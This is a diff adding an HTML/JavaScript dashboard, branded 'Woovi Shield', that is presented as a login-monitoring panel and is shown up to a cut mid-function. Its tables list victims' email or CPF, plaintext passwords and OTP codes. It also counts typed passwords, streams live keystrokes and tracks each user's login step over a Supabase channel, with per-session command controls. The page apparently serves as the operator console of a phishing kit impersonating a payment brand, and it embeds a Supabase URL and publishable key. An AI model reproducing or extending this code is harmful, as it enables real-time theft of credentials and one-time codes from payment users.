@@ -1,0 +1,2172 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Woovi Shield — Painel de Monitoramento</title>
+
+  <!-- Fonte Nunito Sans do Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet" />
+
+  <!-- Supabase JS via CDN (versão fixa para estabilidade) -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.js"></script>
+
+  <!-- Configuração centralizada -->
+  <script src="../config.js"></script>
+
+  <!-- Proteção de autenticação -->
+  <script>
+    (function() {
+      function isTokenValid(token) {
+        try {
+          const [encoded, timestamp] = token.split(':');
+          const decoded = atob(encoded);
+          const tokenTime = parseInt(timestamp, 10);
+          const now = Date.now();
+          return (now - tokenTime) < 7 * 24 * 60 * 60 * 1000;
+        } catch (_) {
+          return false;
+        }
+      }
+
+      const token = localStorage.getItem('shield_auth_token');
+      if (!token || !isTokenValid(token)) {
+        window.location.href = 'login.html';
+      }
+    })();
+  </script>
+
+  <style>
+    /* ============================================================
+       Reset e variáveis de tema
+       ============================================================ */
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      /* Cores Woovi */
+      --color-primary:       #1FB28A;
+      --color-primary-dark:  #178a6b;
+      --color-primary-light: #d4f5ec;
+      --color-primary-glow:  rgba(31, 178, 138, 0.15);
+
+      /* Backgrounds */
+      --color-bg:            #f4f6f9;
+      --color-surface:       #ffffff;
+      --color-surface-2:     #f8fafb;
+      --color-border:        #e2e8f0;
+
+      /* Texto */
+      --color-text:          #1a202c;
+      --color-text-muted:    #718096;
+      --color-text-light:    #a0aec0;
+
+      /* Status */
+      --color-success:       #1FB28A;
+      --color-success-bg:    #d4f5ec;
+      --color-warning:       #f59e0b;
+      --color-warning-bg:    #fef3c7;
+      --color-error:         #ef4444;
+      --color-error-bg:      #fee2e2;
+      --color-info:          #3b82f6;
+      --color-info-bg:       #dbeafe;
+
+      /* Espaçamento */
+      --spacing-xs:   4px;
+      --spacing-sm:   8px;
+      --spacing-md:   16px;
+      --spacing-lg:   24px;
+      --spacing-xl:   32px;
+      --spacing-2xl:  48px;
+
+      /* Tipografia */
+      --font-family: 'Nunito Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      --font-size-xs:   11px;
+      --font-size-sm:   13px;
+      --font-size-base: 15px;
+      --font-size-lg:   18px;
+      --font-size-xl:   22px;
+      --font-size-2xl:  28px;
+
+      /* Bordas e sombras */
+      --radius-sm:   6px;
+      --radius-md:   10px;
+      --radius-lg:   16px;
+      --shadow-sm:   0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
+      --shadow-md:   0 4px 12px rgba(0,0,0,0.08), 0 2px 4px rgba(0,0,0,0.04);
+      --shadow-lg:   0 10px 30px rgba(0,0,0,0.10), 0 4px 8px rgba(0,0,0,0.06);
+
+      /* Transições */
+      --transition: all 0.2s ease;
+    }
+
+    /* ============================================================
+       Base
+       ============================================================ */
+    html, body {
+      height: 100%;
+      font-family: var(--font-family);
+      font-size: var(--font-size-base);
+      color: var(--color-text);
+      background-color: var(--color-bg);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ============================================================
+       Layout geral
+       ============================================================ */
+    .app-wrapper {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ============================================================
+       Header / Navbar
+       ============================================================ */
+    .header {
+      background: var(--color-surface);
+      border-bottom: 1px solid var(--color-border);
+      padding: 0 var(--spacing-xl);
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .header-brand {
+      display: flex;
+      align-items: center;
+      gap: var(--spacing-sm);
+    }
+
+    .header-logo {
+      width: 36px;
+      height: 36px;
+      background: var(--color-primary);
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 800;
+      font-size: var(--font-size-lg);
+    }
+
+    .header-title {
+      font-size: var(--font-size-lg);
+      font-weight: 800;
+      color: var(--color-text);
+    }
+
+    .header-title span {
+      color: var(--color-primary);
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: var(--spacing-md);
+    }
+
+    .connection-badge {
+      display: flex;
+      align-items: center;
+      gap: var(--spacing-xs);
+      font-size: var(--font-size-sm);
+      font-weight: 600;
+      padding: var(--spacing-xs) var(--spacing-sm);
+      border-radius: 20px;
+      background: var(--color-surface-2);
+      border: 1px solid var(--color-border);
+    }
+
+    .connection-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--color-text-light);
+      transition: var(--transition);
+    }
+
+    .connection-dot.connected {
+      background: var(--color-success);
+      animation: pulse-dot 2s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    .last-update {
+      font-size: var(--font-size-xs);
+      color: var(--color-text-muted);
+    }
+
+    /* ============================================================
+       Alerta de configuração
+       ============================================================ */
+    .config-alert {
+      background: #fffbeb;
+      border: 1px solid #fde68a;
+      color: #92400e;
+      padding: var(--spacing-md) var(--spacing-xl);
+      font-size: var(--font-size-sm);
+      display: none;
+      align-items: center;
+      gap: var(--spacing-sm);
+    }
+
+    .config-alert.visible {
+      display: flex;
+    }
+
+    .config-alert code {
+      background: rgba(0,0,0,0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: var(--font-size-xs);
+    }
+
+    /* ============================================================
+       Conteúdo principal
+       ============================================================ */
+    .main-content {
+      flex: 1;
+      padding: var(--spacing-xl);
+      max-width: 1400px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* ============================================================
+       Seção de título
+       ============================================================ */
+    .section-header {
+      margin-bottom: var(--spacing-lg);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: var(--spacing-sm);
+    }
+
+    .section-title {
+      font-size: var(--font-size-xl);
+      font-weight: 800;
+      color: var(--color-text);
+    }
+
+    .section-subtitle {
+      font-size: var(--font-size-sm);
+      color: var(--color-text-muted);
+      margin-top: 2px;
+    }
+
+    /* ============================================================
+       Cards de estatísticas
+       ============================================================ */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: var(--spacing-md);
+      margin-bottom: var(--spacing-xl);
+    }
+
+    .stat-card {
+      background: var(--color-surface);
+      border-radius: var(--radius-lg);
+      padding: var(--spacing-lg);
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--color-border);
+      position: relative;
+      overflow: hidden;
+      transition: var(--transition);
+    }
+
+    .stat-card:hover {
+      box-shadow: var(--shadow-md);
+      transform: translateY(-1px);
+    }
+
+    .stat-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: var(--card-accent, var(--color-primary));
+    }
+
+    .stat-card.card-primary   { --card-accent: var(--color-primary); }
+    .stat-card.card-error     { --card-accent: var(--color-error); }
+    .stat-card.card-warning   { --card-accent: var(--color-warning); }
+    .stat-card.card-info      { --card-accent: var(--color-info); }
+
+    .stat-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      margin-bottom: var(--spacing-md);
+      background: var(--card-bg, var(--color-primary-light));
+    }
+
+    .stat-card.card-primary .stat-icon { background: var(--color-primary-light); }
+    .stat-card.card-error   .stat-icon { background: var(--color-error-bg); }
+    .stat-card.card-warning .stat-icon { background: var(--color-warning-bg); }
+    .stat-card.card-info    .stat-icon { background: var(--color-info-bg); }
+
+    .stat-value {
+      font-size: var(--font-size-2xl);
+      font-weight: 800;
+      color: var(--color-text);
+      line-height: 1;
+      margin-bottom: var(--spacing-xs);
+      font-variant-numeric: tabular-nums;
+    }
+
+    .stat-label {
+      font-size: var(--font-size-sm);
+      color: var(--color-text-muted);
+      font-weight: 600;
+    }
+
+    .stat-delta {
+      position: absolute;
+      top: var(--spacing-md);
+      right: var(--spacing-md);
+      font-size: var(--font-size-xs);
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 12px;
+    }
+
+    .stat-delta.live {
+      background: var(--color-primary-light);
+      color: var(--color-primary-dark);
+    }
+
+    /* ============================================================
+       Grid de duas colunas para tabelas
+       ============================================================ */
+    .tables-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: var(--spacing-lg);
+      margin-bottom: var(--spacing-xl);
+    }
+
+    @media (max-width: 1024px) {
+      .tables-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* ============================================================
+       Cards de painel (tabelas, comandos)
+       ============================================================ */
+    .panel-card {
+      background: var(--color-surface);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--color-border);
+      overflow: hidden;
+    }
+
+    .panel-card-header {
+      padding: var(--spacing-md) var(--spacing-lg);
+      border-bottom: 1px solid var(--color-border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--color-surface);
+    }
+
+    .panel-card-title {
+      font-size: var(--font-size-base);
+      font-weight: 700;
+      color: var(--color-text);
+      display: flex;
+      align-items: center;
+      gap: var(--spacing-sm);
+    }
+
+    .panel-card-title .icon {
+      font-size: 18px;
+    }
+
+    .panel-badge {
+      font-size: var(--font-size-xs);
+      font-weight: 700;
+      padding: 2px 10px;
+      border-radius: 12px;
+      background: var(--color-primary-light);
+      color: var(--color-primary-dark);
+    }
+
+    .panel-badge.realtime {
+      background: var(--color-primary-light);
+      color: var(--color-primary-dark);
+      animation: badge-pulse 3s infinite;
+    }
+
+    @keyframes badge-pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    /* ============================================================
+       Tabelas de dados
+       ============================================================ */
+    .data-table-wrapper {
+      overflow-x: auto;
+      max-height: 420px;
+      overflow-y: auto;
+    }
+
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: var(--font-size-sm);
+    }
+
+    .data-table thead {
+      position: sticky;
+      top: 0;
+      z-index: 1;
+    }
+
+    .data-table thead th {
+      background: var(--color-surface-2);
+      padding: var(--spacing-sm) var(--spacing-md);
+      text-align: left;
+      font-size: var(--font-size-xs);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--color-text-muted);
+      border-bottom: 1px solid var(--color-border);
+      white-space: nowrap;
+    }
+
+    .data-table tbody tr {
+      border-bottom: 1px solid var(--color-border);
+      transition: background 0.15s;
+    }
+
+    .data-table tbody tr:last-child {
+      border-bottom: none;
+    }
+
+    .data-table tbody tr:hover {
+      background: var(--color-surface-2);
+    }
+
+    .data-table tbody tr.new-row {
+      animation: row-flash 1.5s ease;
+    }
+
+    @keyframes row-flash {
+      0%   { background: var(--color-primary-glow); }
+      100% { background: transparent; }
+    }
+
+    .data-table td {
+      padding: var(--spacing-sm) var(--spacing-md);
+      color: var(--color-text);
+      max-width: 200px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .data-table td.wrap {
+      white-space: normal;
+      word-break: break-word;
+    }
+
+    /* ============================================================
+       Badges de status e tipo
+       ============================================================ */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-size: var(--font-size-xs);
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 10px;
+      white-space: nowrap;
+    }
+
+    .badge-success  { background: var(--color-success-bg);  color: #065f46; }
+    .badge-error    { background: var(--color-error-bg);    color: #991b1b; }
+    .badge-warning  { background: var(--color-warning-bg);  color: #92400e; }
+    .badge-info     { background: var(--color-info-bg);     color: #1e40af; }
+    .badge-gray     { background: #f1f5f9;                  color: #475569; }
+
+    /* ============================================================
+       Estado vazio das tabelas
+       ============================================================ */
+    .empty-state {
+      padding: var(--spacing-2xl) var(--spacing-xl);
+      text-align: center;
+      color: var(--color-text-muted);
+    }
+
+    .empty-state .empty-icon {
+      font-size: 36px;
+      margin-bottom: var(--spacing-sm);
+      opacity: 0.5;
+    }
+
+    .empty-state p {
+      font-size: var(--font-size-sm);
+    }
+
+    /* ============================================================
+       Spinner de carregamento
+       ============================================================ */
+    .loading-row td {
+      text-align: center;
+      padding: var(--spacing-xl);
+      color: var(--color-text-muted);
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 2px solid var(--color-border);
+      border-top-color: var(--color-primary);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-right: var(--spacing-xs);
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    /* Dropdown de comandos por linha */
+    .row-cmd-wrap { position: relative; display: inline-block; }
+    .row-cmd-btn {
+      padding: 5px 12px; border-radius: 6px; font-size: 12px;
+      font-weight: 600; font-family: inherit; cursor: pointer;
+      border: 1.5px solid #1FB28A; color: #1FB28A; background: #fff;
+      white-space: nowrap; transition: background 0.15s, color 0.15s;
+    }
+    .row-cmd-btn:hover { background: #1FB28A; color: #fff; }
+    .row-cmd-menu {
+      display: none; position: fixed;
+      background: #fff; border: 1.5px solid #e5e7eb; border-radius: 10px;
+      box-shadow: 0 12px 32px rgba(0,0,0,0.15); z-index: 9999;
+      min-width: 210px; padding: 6px 0;
+      transform: translateX(-50%);
+    }
+    .row-cmd-menu.open { display: block; }
+    .row-cmd-menu button {
+      display: flex; align-items: center; gap: 8px;
+      width: 100%; padding: 8px 16px; background: none;
+      border: none; cursor: pointer; font-size: 13px;
+      font-family: inherit; color: #374151; text-align: left;
+      transition: background 0.1s;
+    }
+    .row-cmd-menu button:hover { background: #f3f4f6; }
+    .row-cmd-menu hr { border: none; border-top: 1px solid #f1f5f9; margin: 4px 0; }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.3); }
+    }
+    .session-chip {
+      display: inline-flex; flex-direction: column;
+      background: #f0fdf4; border: 1.5px solid #bbf7d0;
+      border-radius: 10px; padding: 8px 14px;
+      min-width: 130px; gap: 2px;
+      transition: border-color 0.2s;
+    }
+    .session-chip:hover { border-color: #22c55e; }
+    .session-chip .sid {
+      font-family: monospace; font-size: 13px;
+      font-weight: 700; color: #16a34a;
+    }
+    .session-chip .suser {
+      font-size: 11px; color: #6b7280;
+      white-space: nowrap; overflow: hidden;
+      text-overflow: ellipsis; max-width: 140px;
+    }
+    .session-chip .sstep {
+      font-size: 10px; color: #1FB28A;
+      font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;
+    }
+
+    /* ============================================================
+       Painel de comandos
+       ============================================================ */
+    .commands-panel {
+      margin-bottom: var(--spacing-xl);
+    }
+
+    .commands-grid {
+      display: grid;
+      grid-template-columns: 1fr 1.5fr;
+      gap: var(--spacing-lg);
+    }
+
+    @media (max-width: 800px) {
+      .commands-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Formulário de envio de comando */
+    .command-form {
+      padding: var(--spacing-lg);
+    }
+
+    .form-group {
+      margin-bottom: var(--spacing-md);
+    }
+
+    .form-label {
+      display: block;
+      font-size: var(--font-size-sm);
+      font-weight: 700;
+      color: var(--color-text);
+      margin-bottom: var(--spacing-xs);
+    }
+
+    .form-control {
+      width: 100%;
+      padding: var(--spacing-sm) var(--spacing-md);
+      font-family: var(--font-family);
+      font-size: var(--font-size-sm);
+      color: var(--color-text);
+      background: var(--color-surface);
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-md);
+      outline: none;
+      transition: var(--transition);
+    }
+
+    .form-control:focus {
+      border-color: var(--color-primary);
+      box-shadow: 0 0 0 3px var(--color-primary-glow);
+    }
+
+    select.form-control {
+      cursor: pointer;
+    }
+
+    textarea.form-control {
+      min-height: 100px;
+      resize: vertical;
+      font-family: 'Courier New', monospace;
+      font-size: var(--font-size-xs);
+    }
+
+    .form-hint {
+      margin-top: 4px;
+      font-size: var(--font-size-xs);
+      color: var(--color-text-muted);
+    }
+
+    /* Botões */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: var(--spacing-xs);
+      padding: var(--spacing-sm) var(--spacing-lg);
+      font-family: var(--font-family);
+      font-size: var(--font-size-sm);
+      font-weight: 700;
+      border-radius: var(--radius-md);
+      border: none;
+      cursor: pointer;
+      transition: var(--transition);
+      white-space: nowrap;
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .btn-primary {
+      background: var(--color-primary);
+      color: white;
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      background: var(--color-primary-dark);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(31, 178, 138, 0.3);
+    }
+
+    .btn-secondary {
+      background: var(--color-surface-2);
+      color: var(--color-text);
+      border: 1px solid var(--color-border);
+    }
+
+    .btn-secondary:hover:not(:disabled) {
+      background: var(--color-border);
+    }
+
+    .btn-full {
+      width: 100%;
+    }
+
+    /* Feedback do envio de comando */
+    .command-feedback {
+      margin-top: var(--spacing-sm);
+      font-size: var(--font-size-sm);
+      padding: var(--spacing-sm) var(--spacing-md);
+      border-radius: var(--radius-sm);
+      display: none;
+    }
+
+    .command-feedback.success {
+      display: block;
+      background: var(--color-success-bg);
+      color: #065f46;
+    }
+
+    .command-feedback.error {
+      display: block;
+      background: var(--color-error-bg);
+      color: #991b1b;
+    }
+
+    /* Ações rápidas de comando */
+    .quick-actions {
+      padding: var(--spacing-lg);
+    }
+
+    .quick-actions-title {
+      font-size: var(--font-size-sm);
+      font-weight: 700;
+      color: var(--color-text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: var(--spacing-md);
+    }
+
+    .quick-btn-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: var(--spacing-sm);
+    }
+
+    .quick-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      padding: var(--spacing-md);
+      background: var(--color-surface-2);
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-md);
+      cursor: pointer;
+      transition: var(--transition);
+      text-align: left;
+    }
+
+    .quick-btn:hover {
+      border-color: var(--color-primary);
+      background: var(--color-primary-glow);
+    }
+
+    .quick-btn-icon {
+      font-size: 22px;
+      margin-bottom: var(--spacing-xs);
+    }
+
+    .quick-btn-label {
+      font-size: var(--font-size-sm);
+      font-weight: 700;
+      color: var(--color-text);
+    }
+
+    .quick-btn-desc {
+      font-size: var(--font-size-xs);
+      color: var(--color-text-muted);
+    }
+
+    /* ============================================================
+       Toast de notificações
+       ============================================================ */
+    .toast-container {
+      position: fixed;
+      bottom: var(--spacing-xl);
+      right: var(--spacing-xl);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      gap: var(--spacing-sm);
+      pointer-events: none;
+    }
+
+    .toast {
+      display: flex;
+      align-items: center;
+      gap: var(--spacing-sm);
+      padding: var(--spacing-sm) var(--spacing-md);
+      background: var(--color-text);
+      color: white;
+      border-radius: var(--radius-md);
+      font-size: var(--font-size-sm);
+      font-weight: 600;
+      box-shadow: var(--shadow-lg);
+      pointer-events: all;
+      animation: toast-in 0.3s ease;
+      max-width: 360px;
+    }
+
+    .toast.toast-success { background: var(--color-success); }
+    .toast.toast-error   { background: var(--color-error); }
+    .toast.toast-warning { background: var(--color-warning); color: var(--color-text); }
+
+    @keyframes toast-in {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ============================================================
+       Footer
+       ============================================================ */
+    .footer {
+      text-align: center;
+      padding: var(--spacing-lg);
+      font-size: var(--font-size-xs);
+      color: var(--color-text-muted);
+      border-top: 1px solid var(--color-border);
+    }
+
+    /* ============================================================
+       Responsividade
+       ============================================================ */
+    @media (max-width: 600px) {
+      .main-content {
+        padding: var(--spacing-md);
+      }
+      .stats-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+      .header {
+        padding: 0 var(--spacing-md);
+      }
+      .header-title {
+        font-size: var(--font-size-base);
+      }
+    }
+  </style>
+</head>
+
+<body>
+<div class="app-wrapper">
+
+  <!-- ============================================================
+       Navbar / Header
+       ============================================================ -->
+  <header class="header">
+    <div class="header-brand">
+      <div class="header-logo">W</div>
+      <div>
+        <div class="header-title">Woovi <span>Shield</span></div>
+      </div>
+    </div>
+    <div class="header-right">
+      <div class="connection-badge" id="connectionBadge">
+        <div class="connection-dot" id="connectionDot"></div>
+        <span id="connectionText">Conectando...</span>
+      </div>
+      <div class="last-update" id="lastUpdate">—</div>
+      <button id="logoutBtn" style="background: none; border: none; color: #ef4444; font-weight: 600; cursor: pointer; font-size: 13px; padding: 8px 12px; border-radius: 6px; transition: all 0.2s; margin-left: 12px;" onmouseover="this.style.background='rgba(239,68,68,0.1)'" onmouseout="this.style.background='none'">
+        🚪 Sair
+      </button>
+    </div>
+  </header>
+
+  <!-- Alerta quando as credenciais não estão configuradas -->
+  <div class="config-alert" id="configAlert">
+    ⚠️ Configure as credenciais do Supabase no topo do script:
+    <code>SUPABASE_URL</code> e <code>SUPABASE_ANON_KEY</code>
+  </div>
+
+  <!-- ============================================================
+       Conteúdo principal
+       ============================================================ -->
+  <main class="main-content">
+
+    <!-- ── 3 Stats ── -->
+    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px;">
+
+      <div class="stat-card card-primary" style="margin:0;">
+        <div class="stat-icon" style="animation:pulse 2s infinite;">🟢</div>
+        <div class="stat-value" id="onlineCount">0</div>
+        <div class="stat-label">Clientes Online</div>
+        <div class="stat-delta live">● AO VIVO</div>
+      </div>
+
+      <div class="stat-card card-error" style="margin:0;">
+        <div class="stat-icon">❌</div>
+        <div class="stat-value" id="statErrors">—</div>
+        <div class="stat-label">Erros / Falhas</div>
+      </div>
+
+      <div class="stat-card card-warning" style="margin:0;">
+        <div class="stat-icon">🔑</div>
+        <div class="stat-value" id="statPasswords">—</div>
+        <div class="stat-label">Senhas Digitadas</div>
+      </div>
+
+    </div>
+
+    <!-- ── Tabela de Eventos (largura total) ── -->
+    <div class="panel-card" style="margin-bottom:24px;">
+      <div class="panel-card-header">
+        <div class="panel-card-title">
+          <span class="icon">🔔</span> Eventos de Login
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;">
+          <button class="btn btn-secondary" style="padding:4px 12px;font-size:12px;" onclick="limparEventos()">🗑️ Limpar</button>
+          <span class="panel-badge realtime">● Tempo Real</span>
+        </div>
+      </div>
+      <!-- Filtro por IP -->
+      <div id="ipFilterBar" style="display:none;align-items:center;gap:8px;padding:10px 0 4px;flex-wrap:wrap;">
+        <span style="font-size:12px;color:#6b7280;">Filtrando IP:</span>
+        <span id="ipFilterChip" style="font-family:monospace;font-size:12px;font-weight:700;
+          background:#dbeafe;color:#1d4ed8;padding:3px 10px;border-radius:12px;"></span>
+        <button onclick="limparFiltroIP()" style="font-size:11px;color:#ef4444;background:none;
+          border:1px solid #fca5a5;border-radius:8px;padding:2px 8px;cursor:pointer;">✕ Limpar</button>
+        <span id="ipFilterCount" style="font-size:11px;color:#9ca3af;"></span>
+      </div>
+
+      <div class="data-table-wrapper">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Sessão</th>
+              <th>Email / CPF</th>
+              <th>Senha</th>
+              <th>OTP</th>
+              <th>Step</th>
+              <th>Status</th>
+              <th style="cursor:pointer;" title="Clique no IP para filtrar">IP 🔍</th>
+              <th>Horário</th>
+              <th>Ações</th>
+            </tr>
+          </thead>
+          <tbody id="eventsTableBody">
+            <tr class="loading-row">
+              <td colspan="8"><span class="spinner"></span> Aguardando eventos...</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── Linha inferior: Monitor + Ações ── -->
+    <div style="display:grid;grid-template-columns:1fr 300px;gap:16px;margin-bottom:32px;">
+
+      <!-- Monitor de Digitação -->
+      <div class="panel-card" style="margin:0;">
+        <div class="panel-card-header">
+          <div class="panel-card-title"><span class="icon">⌨️</span> Monitor de Digitação</div>
+          <div style="display:flex;align-items:center;gap:8px;">
+            <button class="btn btn-secondary" style="padding:4px 12px;font-size:12px;" onclick="limparMonitor()">🗑️ Limpar</button>
+            <span class="panel-badge realtime">● Ao Vivo</span>
+          </div>
+        </div>
+        <div id="keystrokeFeed" style="
+          font-family:'Courier New',monospace;font-size:13px;
+          background:#0d1117;color:#c9d1d9;border-radius:8px;
+          padding:14px;min-height:180px;max-height:320px;
+          overflow-y:auto;display:flex;flex-direction:column;gap:4px;">
+          <div data-placeholder style="color:#6e7681;font-style:italic;">Aguardando digitação...</div>
+        </div>
+      </div>
+
+      <!-- Ações Rápidas -->
+      <div class="panel-card" style="margin:0;">
+        <div class="panel-card-header">
+          <div class="panel-card-title"><span class="icon">⚡</span> Ações</div>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:10px;padding-top:4px;">
+          <button class="btn btn-secondary btn-full" onclick="acaoRapida('block_ip', {ip: prompt('IP a bloquear:') || ''})">
+            🚫 Bloquear IP
+          </button>
+          <button class="btn btn-secondary btn-full" onclick="acaoRapida('force_logout', {motivo:'Dashboard admin'})">
+            🚪 Forçar Logout
+          </button>
+          <button class="btn btn-secondary btn-full" onclick="acaoRapida('reset_session', {scope:'all'})">
+            🔄 Resetar Sessões
+          </button>
+          <div style="border-top:1px solid var(--color-border);margin:4px 0;"></div>
+          <button class="btn btn-secondary btn-full" onclick="limparEventos()" style="color:#ef4444;border-color:#ef4444;">
+            🗑️ Limpar Eventos
+          </button>
+          <button class="btn btn-secondary btn-full" onclick="limparMonitor()" style="color:#ef4444;border-color:#ef4444;">
+            🗑️ Limpar Monitor
+          </button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- IDs mantidos para o JS funcionar (hidden) -->
+    <div style="display:none;">
+      <table><tbody id="logsTableBody"></tbody></table>
+      <table><tbody id="commandsTableBody"></tbody></table>
+      <div id="commandFeedback"></div>
+      <select id="cmdAcao"></select>
+      <textarea id="cmdPayload"></textarea>
+      <div id="statCommands"></div>
+      <div id="statActiveSessions"></div>
+      <div id="statTotalEvents"></div>
+    </div>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    Woovi Shield — Sistema de Monitoramento de Login &nbsp;|&nbsp;
+    Dados atualizados em tempo real via Supabase Realtime
+  </footer>
+
+</div>
+
+<!-- Container de toasts -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ============================================================
+     Script principal
+     ============================================================ -->
+<script>
+  // ============================================================
+  // CONFIGURAÇÃO: preencha com suas credenciais do Supabase
+  // Encontre em: https://supabase.com → Seu Projeto → Settings → API
+  // ============================================================
+  const CONFIG = {
+    SUPABASE_URL: 'https://pfbgsviarvnkaadrkxfd.supabase.co',
+    SUPABASE_ANON_KEY: 'sb_publishable_vMQXPTlWH30Bys_bgojo5A_IdyjXEdH',
+  };
+
+  // ============================================================
+  // Estado global da aplicação
+  // ============================================================
+  let supabase = null;
+  let realtimeChannel = null;
+
+  // Cache local dos dados para evitar re-renderizações desnecessárias
+  const state = {
+    events:     [],
+    logs:       [],
+    keystrokes: [], // separado — carrega tudo sem limite fixo
+    commands:   [],
+    connected:  false,
+  };
+
+  // ── Presence: canal dedicado para online em tempo real ──
+  let _presenceChannel = null;
+
+  // ── Filtro por IP ──
+  let _filtroIP = null;
+
+  function filtrarPorIP(ip) {
+    if (!ip || ip === '—') return;
+    _filtroIP = ip;
+    const bar   = document.getElementById('ipFilterBar');
+    const chip  = document.getElementById('ipFilterChip');
+    const count = document.getElementById('ipFilterCount');
+    bar.style.display = 'flex';
+    chip.textContent = ip;
+    renderizarEventos();
+    // Conta sessões com esse IP
+    const sessions = buildSessions();
+    const total = [...sessions.values()].filter(s => s.ip === ip).length;
+    count.textContent = `${total} sessão(ões) encontrada(s)`;
+  }
+
+  function limparFiltroIP() {
+    _filtroIP = null;
+    document.getElementById('ipFilterBar').style.display = 'none';
+    renderizarEventos();
+  }
+
+  // Mapa de sessões online com TTL
+  const _sessions = new Map(); // sessionId → { step, usuario, ts }
+
+  // Mapa de comandos pendentes (aguardando resposta)
+  const _pendingCommands = new Map(); // sessionId → { cmd, labels, timestamp }
+
+  // ── Canal de comandos para clientes ──
+  let _cmdChannel = null;
+
+  function iniciarCanalComandos() {
+    _cmdChannel = supabase.channel('login-online', {
+      config: { broadcast: { self: false } },
+    });
+
+    // Escuta heartbeats de sessão (para atualizar online)
+    _cmdChannel.on('broadcast', { event: 'session' }, ({ payload }) => {
+      if (!payload) return;
+      const { sessionId, action, step, usuario, isWaiting } = payload;
+      if (!sessionId) return;
+
+      if (action === 'leave') {
+        _sessions.delete(sessionId);
+      } else {
+        _sessions.set(sessionId, {
+          usuario: usuario || null,
+          step: step || 'Login',
+          isWaiting: isWaiting ?? false,
+          ts: Date.now(),
+        });
+      }
+      atualizarOnline();
+    });
+
+    _cmdChannel.subscribe(status => {
+      console.log('[Broadcast] Canal conectado:', status);
+    });
+  }
+
+  function toggleDropdown(sid) {
+    // Fecha todos os outros dropdowns abertos
+    document.querySelectorAll('.row-cmd-menu.open').forEach(m => {
+      if (m.dataset.sid !== sid) m.classList.remove('open');
+    });
+
+    const menu = document.querySelector(`.row-cmd-menu[data-sid="${sid}"]`);
